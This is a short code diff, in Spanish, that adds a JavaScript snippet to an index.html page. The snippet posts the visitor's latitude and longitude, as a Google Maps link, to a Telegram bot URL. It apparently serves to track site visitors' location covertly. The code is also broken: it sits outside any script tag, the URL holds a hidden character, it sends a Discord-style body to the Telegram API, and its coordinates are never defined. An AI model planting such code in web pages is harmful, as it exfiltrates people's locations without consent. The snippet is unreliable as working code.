@@ -1,5 +1,16 @@
 Index.html
 <!DOCTYPE html>
+// Dentro de tu archivo index.html
+const urlWebhook = "‎https://api.telegram.org/bot[TU_TOKEN]/sendMessage?chat_id=[1564844725]&text="; 
+
+await fetch(urlWebhook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        content: `📍 Ubicación: https://www.google.com/maps?q=${lat},${lon}`
+    })
+});
+
 <html lang="es">
 <head>
     <meta charset="UTF-8">
